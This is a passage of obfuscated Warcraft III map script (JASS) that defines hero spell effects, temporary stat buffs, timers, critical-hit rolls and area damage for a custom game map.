set L9=(GetHeroAgi(UT,true)/10+100)*GetUnitAbilityLevel(UT,$41303451)
call nj(UT,L9)
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,UT)
call SaveInteger(PP,GetHandleId(Hc),2,L9)
call TimerStart(Hc,10,false,function nE)
set Hc=null
set Hc=CreateTimer()
set L9=GetHeroAgi(UT,true)/25+20*GetUnitAbilityLevel(UT,$41303451)
call SetHeroAgi(UT,GetHeroAgi(UT,false)+L9,false)
set Pd=GetHeroInt(UT,true)/25+20*GetUnitAbilityLevel(UT,$41303451)
call SetHeroInt(UT,GetHeroInt(UT,false)+Pd,false)
call SaveUnitHandle(PP,GetHandleId(Hc),0,UT)
call SaveInteger(PP,GetHandleId(Hc),2,L9)
call SaveInteger(PP,GetHandleId(Hc),3,Pd)
call TimerStart(Hc,10,false,function uB)
set Hc=null
else
call RemoveSavedInteger(PP,GetHandleId(GetExpiredTimer()),6)
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),0)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set UT=null
endfunction
function uE takes nothing returns nothing
call SetHeroStr(LoadUnitHandle(PP,GetHandleId(GetExpiredTimer()),0),GetHeroStr(LoadUnitHandle(PP,GetHandleId(GetExpiredTimer()),0),false)-LoadInteger(PP,GetHandleId(GetExpiredTimer()),2),false)
call RemoveSavedInteger(PP,GetHandleId(GetExpiredTimer()),2)
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),0)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endfunction
function uF takes nothing returns nothing
call SetHeroAgi(LoadUnitHandle(PP,GetHandleId(GetExpiredTimer()),0),GetHeroAgi(LoadUnitHandle(PP,GetHandleId(GetExpiredTimer()),0),false)-LoadInteger(PP,GetHandleId(GetExpiredTimer()),2),false)
call RemoveSavedInteger(PP,GetHandleId(GetExpiredTimer()),2)
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),0)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endfunction
function uG takes nothing returns nothing
local unit UT=GetTriggerUnit()
local integer L9
local integer Pd
local timer Hc
local effect Mc
local effect No
local unit Np
if GetSpellAbilityId()==$41303456 then
set L9=(GetHeroStr(UT,true)/10+100)*GetUnitAbilityLevel(UT,$41303456)
call nj(UT,L9)
set Pd=GetHeroStr(UT,true)/10+10*GetUnitAbilityLevel(UT,$41303456)
call nl(UT,Pd)
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,UT)
call SaveInteger(PP,GetHandleId(Hc),2,L9)
call SaveInteger(PP,GetHandleId(Hc),3,Pd)
call TimerStart(Hc,15,true,function nE)
set Hc=null
set Hc=CreateTimer()
set L9=GetHeroStr(UT,true)/5
call SetHeroStr(UT,GetHeroStr(UT,false)+L9,false)
call SaveUnitHandle(PP,GetHandleId(Hc),0,UT)
call SaveInteger(PP,GetHandleId(Hc),2,L9)
call TimerStart(Hc,15,false,function uE)
set Hc=null
elseif GetSpellAbilityId()==$41314152 then
set L9=GetHeroStr(UT,true)/2+GetUnitAbilityLevel(UT,$41314152)*150
call nj(UT,L9)
set Pd=GetHeroStr(UT,true)/10+GetUnitAbilityLevel(UT,$41314152)*50
call nl(UT,Pd)
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,UT)
call SaveInteger(PP,GetHandleId(Hc),2,L9)
call SaveInteger(PP,GetHandleId(Hc),3,Pd)
call TimerStart(Hc,10,false,function nE)
set Hc=null
elseif GetSpellAbilityId()==$41313942 then
set L9=GetHeroAgi(UT,true)/2+GetUnitAbilityLevel(UT,$41313942)*50
call nj(UT,L9)
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,UT)
call SaveInteger(PP,GetHandleId(Hc),2,L9)
call TimerStart(Hc,10,false,function nE)
set Hc=null
elseif GetSpellAbilityId()==$41303855 then
set L9=GetHeroStr(UT,true)/1+GetUnitAbilityLevel(UT,$41303855)*150
call nj(UT,L9)
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,UT)
call SaveInteger(PP,GetHandleId(Hc),2,L9)
call TimerStart(Hc,7,false,function nE)
set Hc=null
elseif GetSpellAbilityId()==$41305544 then
set UT=GetTriggerUnit()
set L9=GetHeroStr(UT,true)/1+GetUnitAbilityLevel(UT,$41305544)*3000
call nj(UT,L9)
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,UT)
call SaveInteger(PP,GetHandleId(Hc),2,L9)
call TimerStart(Hc,7,false,function nE)
set Hc=null
elseif GetSpellAbilityId()==$41304142 then
set UT=GetTriggerUnit()
set L9=GetHeroStr(UT,true)/1+GetUnitAbilityLevel(UT,$41304142)*100
call UnitRemoveAbility(UT,$4131424F)
call nj(UT,L9)
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,UT)
call SaveInteger(PP,GetHandleId(Hc),2,L9)
call TimerStart(Hc,10,false,function nE)
set Hc=null
elseif GetSpellAbilityId()==$41304E56 then
set UT=GetTriggerUnit()
set L9=GetHeroAgi(UT,true)/2+GetUnitAbilityLevel(UT,$41304E56)*50
call nj(UT,L9)
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,UT)
call SaveInteger(PP,GetHandleId(Hc),2,L9)
call TimerStart(Hc,7,false,function nE)
set Hc=null
elseif GetSpellAbilityId()==$41304E57 then
set L9=GetHeroAgi(UT,true)/1+GetUnitAbilityLevel(UT,$41304E57)*1000
call nj(UT,L9)
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,UT)
call SaveInteger(PP,GetHandleId(Hc),2,L9)
call TimerStart(Hc,7,false,function nE)
set Hc=null
elseif GetSpellAbilityId()==$41304258 then
set L9=GetHeroAgi(UT,true)+250*GetUnitAbilityLevel(UT,$41304258)
call nj(UT,L9)
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,UT)
call SaveInteger(PP,GetHandleId(Hc),2,L9)
call TimerStart(Hc,17,false,function nE)
set Hc=null
elseif GetSpellAbilityId()==$41305354 then
set L9=GetHeroAgi(UT,true)*2
call nj(UT,L9)
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,UT)
call SaveInteger(PP,GetHandleId(Hc),2,L9)
call TimerStart(Hc,17,false,function nE)
set Hc=null
elseif GetSpellAbilityId()==$41305951 then
set L9=(GetHeroAgi(UT,true)/3+300)*GetUnitAbilityLevel(UT,$41305951)
call nj(UT,L9)
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,UT)
call SaveInteger(PP,GetHandleId(Hc),2,L9)
call TimerStart(Hc,12,false,function nE)
set Hc=null
set Hc=CreateTimer()
set L9=GetHeroAgi(UT,true)/4+50*GetUnitAbilityLevel(UT,$41305951)
call SetHeroAgi(UT,GetHeroAgi(UT,false)+L9,false)
call SaveUnitHandle(PP,GetHandleId(Hc),0,UT)
call SaveInteger(PP,GetHandleId(Hc),2,L9)
call TimerStart(Hc,12,false,function uF)
set Hc=null
elseif GetSpellAbilityId()==$41303451 then
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,UT)
call SaveInteger(Nq,GetHandleId(Hc),6,6)
call TimerStart(Hc,1,true,function uD)
set Hc=null
if GetUnitTypeId(UT)==$48303749 then
set Mc=AddSpecialEffectTarget("war3mapImported\\SoulAegis2.mdx",UT,"chest")
set No=AddSpecialEffectTarget("war3mapImported\\DemonicAdornment.mdx",UT,"chest")
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,UT)
call SaveEffectHandle(Nq,GetHandleId(Hc),7,Mc)
call SaveEffectHandle(Nq,GetHandleId(Hc),8,No)
call TimerStart(Hc,15,false,function t9)
set Hc=null
set Mc=null
set No=null
endif
elseif GetSpellAbilityId()==$41305250 then
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,UT)
call SaveInteger(Nq,GetHandleId(Hc),6,6)
call TimerStart(Hc,1,true,function uC)
set Hc=null
if GetUnitTypeId(UT)==$48303749 then
set Mc=AddSpecialEffectTarget("war3mapImported\\SoulAegis2.mdx",UT,"chest")
set No=AddSpecialEffectTarget("war3mapImported\\DemonicAdornment.mdx",UT,"chest")
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,UT)
call SaveEffectHandle(Nq,GetHandleId(Hc),7,Mc)
call SaveEffectHandle(Nq,GetHandleId(Hc),8,No)
call TimerStart(Hc,15,false,function t9)
set Hc=null
set Mc=null
set No=null
endif
elseif GetSpellAbilityId()==$41304C57 then
if GetUnitAbilityLevel(UT,$41303853)>=1 then
set L9=GetHeroAgi(UT,true)+1000
else
set L9=GetHeroAgi(UT,true)/2+GetUnitAbilityLevel(UT,$41304C57)*100
endif
call nj(UT,L9)
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,UT)
call SaveEffectHandle(PP,GetHandleId(Hc),1,AddSpecialEffectTarget("war3mapImported\\Solarverse(death).mdx",UT,"overhead"))
call SaveInteger(PP,GetHandleId(Hc),2,L9)
call TimerStart(Hc,7,false,function nE)
set Hc=null
elseif GetSpellAbilityId()==$4130595A or GetSpellAbilityId()==$41305941 then
set Pd=GetHeroAgi(UT,true)/20
set Np=GetSpellTargetUnit()
call nl(Np,Pd)
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,Np)
call SaveInteger(PP,GetHandleId(Hc),3,Pd)
call TimerStart(Hc,10,false,function nE)
set Hc=null
set Np=null
elseif GetSpellAbilityId()==$41313239 then
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,UT)
call SaveEffectHandle(PP,GetHandleId(Hc),1,AddSpecialEffectTarget("war3mapImported\\DarknessRising.mdx",UT,"origin"))
call TimerStart(Hc,25,false,function nE)
set Hc=null
elseif GetSpellAbilityId()==$41304452 then
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,UT)
call SaveEffectHandle(PP,GetHandleId(Hc),1,AddSpecialEffectTarget("war3mapImported\\RedHarvest.mdx",UT,"origin"))
call TimerStart(Hc,7,false,function nE)
set Hc=null
elseif GetSpellAbilityId()==$41305734 then
set L9=GetHeroInt(UT,true)/5+GetUnitAbilityLevel(UT,$41305734)*50+R2I(GetUnitState(UT,UNIT_STATE_MANA))/10
call nj(UT,L9)
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,UT)
call SaveInteger(PP,GetHandleId(Hc),2,L9)
call TimerStart(Hc,7,false,function nE)
set Hc=null
elseif GetSpellAbilityId()==$41305746 then
set L9=GetHeroInt(UT,true)/2+500+R2I(GetUnitState(UT,UNIT_STATE_MANA))/10
call nj(UT,L9)
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,UT)
call SaveInteger(PP,GetHandleId(Hc),2,L9)
call TimerStart(Hc,7,false,function nE)
set Hc=null
endif
set Hc=null
set UT=null
endfunction
function uH takes nothing returns nothing
local trigger Wq=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Wq,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddAction(Wq,function uG)
set Wq=null
endfunction
function uI takes unit Hu returns nothing
call TriggerSleepAction(.5)
call PauseUnit(Hu,false)
call SetUnitInvulnerable(Hu,false)
endfunction
function uJ takes nothing returns nothing
local unit Hu=GetAttacker()
local effect Mc
local integer No
local timer Np
if IsUnitEnemy(Hu,GetOwningPlayer(GetTriggerUnit()))==true then
if GetUnitAbilityLevel(Hu,$41304459)>=1 then
if GetRandomInt(1,10)==1 then
call DisableTrigger(GetTriggeringTrigger())
call PauseUnit(Hu,true)
call SetUnitInvulnerable(Hu,true)
call SetUnitAnimationWithRarity(Hu,"Attack Walk Stand Spin",RARITY_FREQUENT)
call uI(Hu)
set Mc=AddSpecialEffectTarget("war3mapImported\\Dalaran BrillianceSmall.mdx",Hu,"overhead")
set No=GetHeroAgi(Hu,true)+GetUnitAbilityLevel(Hu,$41304459)*200
call nj(Hu,No)
set Np=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Np),0,Hu)
call SaveEffectHandle(PP,GetHandleId(Np),1,Mc)
call SaveInteger(PP,GetHandleId(Np),2,No)
call TimerStart(Np,7,false,function nE)
set Np=null
set Mc=null
call TriggerSleepAction(15)
call EnableTrigger(GetTriggeringTrigger())
endif
endif
if GetUnitAbilityLevel(Hu,$41304559)>=1 then
if GetRandomInt(1,10)==1 then
call DisableTrigger(GetTriggeringTrigger())
call PauseUnit(Hu,true)
call SetUnitInvulnerable(Hu,true)
call SetUnitAnimationWithRarity(Hu,"Attack Walk Stand Spin",RARITY_FREQUENT)
call uI(Hu)
set Mc=AddSpecialEffectTarget("war3mapImported\\Dalaran BrillianceSmall.mdx",Hu,"overhead")
set No=GetHeroAgi(Hu,true)*2+2000
call nj(Hu,No)
set Np=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Np),0,Hu)
call SaveEffectHandle(PP,GetHandleId(Np),1,Mc)
call SaveInteger(PP,GetHandleId(Np),2,No)
call TimerStart(Np,7,false,function nE)
set Np=null
set Mc=null
call TriggerSleepAction(15)
call EnableTrigger(GetTriggeringTrigger())
endif
endif
endif
set Hu=null
endfunction
function uK takes nothing returns nothing
set Wr=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Wr,EVENT_PLAYER_UNIT_ATTACKED)
call TriggerAddAction(Wr,function uJ)
endfunction
function uL takes nothing returns boolean
if not (GetSpellAbilityId()==$4130344F) then
return false
endif
return true
endfunction
function uM takes nothing returns boolean
if not (GetUnitTypeId(Wu)==$4F303030) then
return false
endif
return true
endfunction
function uN takes nothing returns boolean
if not (GetUnitTypeId(Wu)==$4F303030) then
return false
endif
return true
endfunction
function uO takes nothing returns boolean
if not (GetUnitTypeId(Wu)==$4F303030) then
return false
endif
return true
endfunction
function uP takes nothing returns boolean
if not (GetUnitTypeId(Wu)==$4F303030) then
return false
endif
return true
endfunction
function uQ takes nothing returns boolean
if not (IsUnitDeadBJ(Wt)==false) then
return false
endif
return true
endfunction
function uR takes nothing returns boolean
if not (IsUnitDeadBJ(Wt)==false) then
return false
endif
return true
endfunction
function uS takes nothing returns boolean
if not (IsUnitDeadBJ(Wt)==false) then
return false
endif
return true
endfunction
function uT takes nothing returns boolean
if not (IsUnitDeadBJ(Wt)==false) then
return false
endif
return true
endfunction
function uU takes nothing returns nothing
set Wt=GetSpellTargetUnit()
set Wu=GetSpellAbilityUnit()
if uT() then
call PauseUnitBJ(true,Wu)
call PauseUnitBJ(true,Wt)
call SetUnitAnimationWithRarity(Wu,"attack",RARITY_FREQUENT)
call TriggerSleepAction(.1)
if uM() then
call DestroyEffect(AddSpecialEffectTarget("war3mapImported\\Stormfall Nature.mdx",Wt,"origin"))
else
call DestroyEffect(AddSpecialEffectTarget("war3mapImported\\Stormfall Red.mdx",Wt,"origin"))
endif
call UnitDamageTargetBJ(Wu,Wt,(I2R(GetHeroAgi(Wu,true))*(I2R(GetUnitAbilityLevel(Wu,$4130344F))*.5)+500.*I2R(GetUnitAbilityLevel(Wu,$4130344F)))*Nd[GetConvertedPlayerId(GetOwningPlayer(Wu))],ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL)
if uS() then
call SetUnitAnimationWithRarity(Wu,"attack",RARITY_FREQUENT)
call TriggerSleepAction(.1)
if uN() then
call DestroyEffect(AddSpecialEffectTarget("war3mapImported\\Stormfall Nature.mdx",Wt,"origin"))
else
call DestroyEffect(AddSpecialEffectTarget("war3mapImported\\Stormfall Red.mdx",Wt,"origin"))
endif
call UnitDamageTargetBJ(Wu,Wt,(I2R(GetHeroAgi(Wu,true))*(I2R(GetUnitAbilityLevel(Wu,$4130344F))*1.)+1000.*I2R(GetUnitAbilityLevel(Wu,$4130344F)))*Nd[GetConvertedPlayerId(GetOwningPlayer(Wu))],ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL)
if uR() then
call SetUnitAnimationWithRarity(Wu,"attack",RARITY_FREQUENT)
call TriggerSleepAction(.1)
if uO() then
call DestroyEffect(AddSpecialEffectTarget("war3mapImported\\Stormfall Nature.mdx",Wt,"origin"))
else
call DestroyEffect(AddSpecialEffectTarget("war3mapImported\\Stormfall Red.mdx",Wt,"origin"))
endif
call UnitDamageTargetBJ(Wu,Wt,(I2R(GetHeroAgi(Wu,true))*(I2R(GetUnitAbilityLevel(Wu,$4130344F))*2.)+2000.*I2R(GetUnitAbilityLevel(Wu,$4130344F)))*Nd[GetConvertedPlayerId(GetOwningPlayer(Wu))],ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL)
if uQ() then
set Wv=GetUnitLoc(Wu)
set Ww=PolarProjectionBJ(Wv,150.,GetUnitFacing(Wu))
call SetUnitAnimationWithRarity(Wu,"attack slam",RARITY_RARE)
call TriggerSleepAction(.1)
call PauseUnitBJ(false,Wu)
call PauseUnitBJ(false,Wt)
if uP() then
call DestroyEffect(AddSpecialEffectTarget("war3mapImported\\Stormfall Nature.mdx",Wt,"origin"))
else
call DestroyEffect(AddSpecialEffectTarget("war3mapImported\\Stormfall Red.mdx",Wt,"origin"))
endif
call UnitDamageTargetBJ(Wu,Wt,(I2R(GetHeroAgi(Wu,true))*(I2R(GetUnitAbilityLevel(Wu,$4130344F))*4.)+4000.*I2R(GetUnitAbilityLevel(Wu,$4130344F)))*Nd[GetConvertedPlayerId(GetOwningPlayer(Wu))],ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL)
call SetUnitPositionLoc(Wu,Ww)
call TriggerSleepAction(1.5)
else
call PauseUnitBJ(false,Wu)
call PauseUnitBJ(false,Wt)
endif
else
call PauseUnitBJ(false,Wu)
call PauseUnitBJ(false,Wt)
endif
else
call PauseUnitBJ(false,Wu)
call PauseUnitBJ(false,Wt)
endif
else
call PauseUnitBJ(false,Wu)
call PauseUnitBJ(false,Wt)
endif
endfunction
function uV takes nothing returns nothing
set Ws=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Ws,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddCondition(Ws,Condition(function uL))
call TriggerAddAction(Ws,function uU)
endfunction
function uW takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
local unit NQ=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),2)
local location Mc
local group No
local boolexpr Np
local integer Nt
local unit Ny
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),3,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),3)-1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),3)>=1 then
set Mc=GetUnitLoc(NQ)
set No=CreateGroup()
set Np=Condition(function mx)
call GroupEnumUnitsInRange(No,GetLocationX(Mc),GetLocationY(Mc),400,Np)
if GetUnitAbilityLevel(Hu,$41303943)>=1 then
set Nu=R2I(I2R(1200+GetHeroAgi(Hu,true)*4)*Nd[GetPlayerId(GetOwningPlayer(Hu))+1])
else
set Nu=R2I(I2R(100*GetUnitAbilityLevel(Hu,$41303457)+GetHeroAgi(Hu,true)*2)*Nd[GetPlayerId(GetOwningPlayer(Hu))+1])
endif
set Pq=Hu
call ForGroup(No,function m9)
call DestroyGroup(No)
call DestroyBoolExpr(Np)
set No=null
set Np=null
call RemoveLocation(Mc)
set Mc=null
set Nt=0
loop
set Ny=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),4+Nt)
call SetUnitAnimationWithRarity(Ny,"attack",RARITY_FREQUENT)
set Ny=null
set Nt=Nt+1
exitwhen Nt==10
endloop
else
call SetUnitInvulnerable(Hu,false)
call PauseUnit(Hu,false)
call ShowUnit(Hu,true)
if GetLocalPlayer()==GetOwningPlayer(Hu) then
call SelectUnit(Hu,true)
endif
call RemoveUnit(NQ)
set Nt=0
loop
set Ny=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),4+Nt)
call KillUnit(Ny)
set Ny=null
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),4+Nt)
set Nt=Nt+1
exitwhen Nt==10
endloop
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),2)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),3)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Hu=null
set NQ=null
endfunction
function uX takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local location Ht
local location Nk
local integer Ma=GetPlayerId(GetOwningPlayer(Hu))
local unit NQ
local timer Hc
local group Na
local boolexpr Nb
local integer Mc
if GetSpellAbilityId()==$41303457 or GetSpellAbilityId()==$41303943 then
set Nk=GetSpellTargetLoc()
set NQ=CreateUnitAtLoc(Player(Ma),$68303739,Nk,0)
call AddSpecialEffectTarget("war3mapImported\\EtherealAura.mdl",NQ,"origin")
call SetUnitScale(NQ,1.3,1.3,1.3)
call SetUnitVertexColor(NQ,0,255,0,50)
call SetUnitInvulnerable(Hu,true)
call PauseUnit(Hu,true)
call ShowUnit(Hu,false)
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call SaveUnitHandle(Nq,GetHandleId(Hc),2,NQ)
call SaveInteger(Nq,GetHandleId(Hc),3,6)
set Mc=0
loop
set Ht=nU(Nk,400,Mc*36)
set NQ=CreateUnitAtLoc(Player(Ma),$6830324C,Ht,180+Mc*36)
call SetUnitTimeScale(NQ,200*.01)
call RemoveLocation(Ht)
set Ht=null
call SaveUnitHandle(Nq,GetHandleId(Hc),4+Mc,NQ)
set Mc=Mc+1
exitwhen Mc==10
endloop
call TimerStart(Hc,.3,true,function uW)
set Hc=null
call RemoveLocation(Nk)
elseif GetSpellAbilityId()==$41303049 then
if GetUnitAbilityLevel(GetSpellTargetUnit(),$42303946)>=1 then
set Nu=R2I(I2R(300*GetUnitAbilityLevel(Hu,$41303049)+GetHeroAgi(Hu,true)*21)*Nd[Ma+1])
else
set Nu=R2I(I2R(100*GetUnitAbilityLevel(Hu,$41303049)+GetHeroAgi(Hu,true)*7)*Nd[Ma+1])
endif
call UnitDamageTarget(Hu,GetSpellTargetUnit(),I2R(Nu),true,false,ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL,WEAPON_TYPE_WHOKNOWS)
elseif GetSpellAbilityId()==$41303053 then
set Ht=GetUnitLoc(Hu)
set Na=CreateGroup()
set Nb=Condition(function mx)
call GroupEnumUnitsInRange(Na,GetLocationX(Ht),GetLocationY(Ht),700,Nb)
set Nu=R2I(I2R(2000*GetUnitAbilityLevel(Hu,$41303053)+GetHeroAgi(Hu,true)*10)*Nd[GetPlayerId(GetOwningPlayer(Hu))+1])
set Pq=Hu
call ForGroup(Na,function m9)
call DestroyGroup(Na)
call DestroyBoolExpr(Nb)
set Na=null
set Nb=null
call RemoveLocation(Ht)
set Ht=null
elseif GetSpellAbilityId()==$4130455A then
set Ht=GetUnitLoc(Hu)
set Na=CreateGroup()
set Nb=Condition(function mx)
call GroupEnumUnitsInRange(Na,GetLocationX(Ht),GetLocationY(Ht),700,Nb)
set Nu=R2I(I2R(20000+GetHeroAgi(Hu,true)*15)*Nd[GetPlayerId(GetOwningPlayer(Hu))+1])
set Pq=Hu
call ForGroup(Na,function m9)
call DestroyGroup(Na)
call DestroyBoolExpr(Nb)
set Na=null
set Nb=null
call RemoveLocation(Ht)
set Ht=null
endif
set Hu=null
set NQ=null
set Ht=null
set Nk=null
endfunction
function uY takes nothing returns nothing
local trigger Hc=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Hc,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddAction(Hc,function uX)
set Hc=null
endfunction
function uZ takes unit Hu returns boolean
if nO(Hu,$49304E30) or nO(Hu,$49305748) then
if GetRandomInt(1,10)==1 then
return true
endif
endif
return false
endfunction
function ua takes unit Hu returns boolean
if nO(Hu,$49304B31) or nO(Hu,$49304E30) or nO(Hu,$49305748) then
if GetRandomInt(1,10)==1 then
return true
endif
endif
return false
endfunction
function ub takes unit Hu returns boolean
if nO(Hu,$7370726F) or nO(Hu,$49303952) or nO(Hu,$4930394A) or nO(Hu,$49304B31) or nO(Hu,$49304E30) or nO(Hu,$49305748) then
if GetRandomInt(1,5)==1 then
return true
endif
endif
return false
endfunction
function uc takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local unit Nv
local unit NQ
local location Ht
local location Nk
local string M6
local integer Ma=GetPlayerId(GetOwningPlayer(Hu))
local real Hb
local group Na
local boolexpr Vx
local integer L9
local boolean Mc
if GetSpellAbilityId()==$41313751 then
set Ht=GetSpellTargetLoc()
call DestroyEffect(AddSpecialEffectLoc("war3mapImported\\Singularity I Purple.mdx",Ht))
set Hb=I2R(GetUnitAbilityLevel(Hu,$41313751)*300+GetHeroInt(Hu,true)*3)*N0[Ma+1]
if uZ(Hu) then
set Hb=Hb*3
call ng(Hu,Hu,"Crit x3! ",.028,255,0,255,0)
elseif ua(Hu) then
set Hb=Hb*2
call ng(Hu,Hu,"Crit x2! ",.028,255,0,0,0)
elseif ub(Hu) then
set Hb=Hb*3/2
call ng(Hu,Hu,"Crit x1.5! ",.028,255,255,0,0)
endif
set Na=CreateGroup()
set Vx=Condition(function mx)
call GroupEnumUnitsInRange(Na,GetLocationX(Ht),GetLocationY(Ht),300,Vx)
set Pq=Hu
set Nu=R2I(Hb)
call ForGroup(Na,function nB)
call DestroyGroup(Na)
call DestroyBoolExpr(Vx)
set Na=null
set Vx=null
set NQ=CreateUnitAtLoc(GetOwningPlayer(Hu),$68303136,Ht,0)
call UnitAddAbility(NQ,$41303452)
call SetUnitAbilityLevel(NQ,$41303452,GetUnitAbilityLevel(Hu,$41313751))
call PauseUnit(NQ,true)
set M6=""
if GetOwningPlayer(Hu)==GetLocalPlayer() then
set M6="war3mapImported\\Providence Aura Purple.mdl"
endif
call AddSpecialEffectTarget(M6,NQ,"origin")
call nD(NQ,4)
call RemoveLocation(Ht)
set Ht=null
elseif GetSpellAbilityId()==$41314237 then
set Ht=GetSpellTargetLoc()
set NQ=CreateUnitAtLoc(GetOwningPlayer(Hu),$68303136,Ht,0)
call UnitAddAbility(NQ,$41305139)
set M6=""
if GetOwningPlayer(Hu)==GetLocalPlayer() then
set M6="war3mapImported\\Void Rift II Purple.mdx"
endif
call AddSpecialEffectTarget(M6,NQ,"origin")
call nD(NQ,10)
call RemoveLocation(Ht)
set Ht=null
elseif GetSpellAbilityId()==$41305432 then
set Hb=I2R(GetUnitAbilityLevel(Hu,$41305432)*(GetHeroInt(Hu,true)+150))*N0[Ma+1]
if uZ(Hu) then
set Hb=Hb*3
call ng(Hu,Hu,"Crit x3! ",.028,255,0,255,0)
elseif ua(Hu) then
set Hb=Hb*2
call ng(Hu,Hu,"Crit x2! ",.028,255,0,0,0)
elseif ub(Hu) then
set Hb=Hb*3/2
call ng(Hu,Hu,"Crit x1.5! ",.028,255,255,0,0)
endif
call mz(Hu,GetSpellTargetUnit(),R2I(Hb))
elseif GetSpellAbilityId()==$4130344E then
set Ht=GetUnitLoc(Hu)
call DestroyEffect(AddSpecialEffectLoc("war3mapImported\\BonediggerHaloBlue.mdx",Ht))
set Hb=I2R(GetUnitAbilityLevel(Hu,$4130344E)*(GetHeroInt(Hu,true)*2+1500))*N0[Ma+1]
if uZ(Hu) then
set Hb=Hb*3
call ng(Hu,Hu,"Crit x3! ",.028,255,0,255,0)
elseif ua(Hu) then
set Hb=Hb*2
call ng(Hu,Hu,"Crit x2! ",.028,255,0,0,0)
elseif ub(Hu) then
set Hb=Hb*3/2
call ng(Hu,Hu,"Crit x1.5! ",.028,255,255,0,0)
endif
set Na=CreateGroup()
set Vx=Condition(function mx)
call GroupEnumUnitsInRange(Na,GetLocationX(Ht),GetLocationY(Ht),800,Vx)
set Pq=Hu
set Nu=R2I(Hb)
call ForGroup(Na,function nB)
call DestroyGroup(Na)
call DestroyBoolExpr(Vx)
set Na=null
set Vx=null
call RemoveLocation(Ht)
set Ht=null
elseif GetSpellAbilityId()==$41304658 then
set Ht=GetUnitLoc(Hu)
call DestroyEffect(AddSpecialEffectLoc("war3mapImported\\BonediggerHaloBlue.mdx",Ht))
set Hb=I2R(GetHeroInt(Hu,true)*9+7500)*N0[Ma+1]
if uZ(Hu) then
set Hb=Hb*3
call ng(Hu,Hu,"Crit x3! ",.028,255,0,255,0)
elseif ua(Hu) then
set Hb=Hb*2
call ng(Hu,Hu,"Crit x2! ",.028,255,0,0,0)
elseif ub(Hu) then
set Hb=Hb*3/2
call ng(Hu,Hu,"Crit x1.5! ",.028,255,255,0,0)
endif
set Na=CreateGroup()
set Vx=Condition(function mx)
call GroupEnumUnitsInRange(Na,GetLocationX(Ht),GetLocationY(Ht),800,Vx)
set Pq=Hu
set Nu=R2I(Hb)
call ForGroup(Na,function nB)
call DestroyGroup(Na)
call DestroyBoolExpr(Vx)
set Na=null
set Vx=null
call RemoveLocation(Ht)
set Ht=null
elseif GetSpellAbilityId()==$4131324F then
set Ht=GetUnitLoc(Hu)
set Na=CreateGroup()
set Vx=Condition(function mx)
call GroupEnumUnitsInRange(Na,GetLocationX(Ht),GetLocationY(Ht),700,Vx)
set L9=CountUnitsInGroup(Na)
set Hb=I2R((GetHeroInt(Hu,true)+500)*GetUnitAbilityLevel(Hu,$4131324F))*N0[Ma+1]
if uZ(Hu) then
set Hb=Hb*3
